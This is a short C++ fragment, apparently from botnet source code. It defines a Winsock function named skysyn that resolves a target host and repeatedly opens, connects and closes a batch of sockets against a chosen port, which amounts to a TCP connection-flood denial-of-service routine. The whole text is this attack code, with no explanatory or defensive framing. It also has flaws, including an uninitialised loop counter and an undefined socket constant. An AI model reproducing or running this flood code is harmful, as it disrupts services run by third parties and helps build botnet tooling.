	   

int skysyn(string target,string port,string length){

   char serverip[20];
   sockaddr_in addr;
     
  addr.sin_family = AF_INET;
  int Port=atoi(port.c_str());
  addr.sin_port = htons(Port);

     
    hostent *dns = gethostbyname(target.c_str());

    sprintf(serverip, "%u.%u.%u.%u",
			(unsigned char) dns->h_addr_list[0][0],	(unsigned char) dns->h_addr_list[0][1],
			(unsigned char) dns->h_addr_list[0][2], (unsigned char) dns->h_addr_list[0][3]);
    addr.sin_addr.s_addr = inet_addr(serverip);
	
      SOCKET sock[SKYSYN_SOCKETS];
        	int c0unt=atoi(length.c_str());
            int number;
    while(number<c0unt){
//open all sockets
		 for(int i=0;i<SKYSYN_SOCKETS;i++){
			sock[i] = socket(AF_INET, SOCK_STREAM, 0);
			if (sock[i] == INVALID_SOCKET){
				continue;}
			
			Sleep(50);
		 }
//connect all sockets
		for(i=0;i<SKYSYN_SOCKETS;i++){
                    int conn=connect(sock[i],(SOCKADDR*)&addr,sizeof(SOCKADDR));
					if (conn==SOCKET_ERROR){
						continue;	}
					Sleep(50);
		}
//close all sockets
		for(i=0;i<SKYSYN_SOCKETS;i++){
		 closesocket(sock[i]);
		}
     
number++; 
 Sleep(10);
	}  
  
return 0;
}
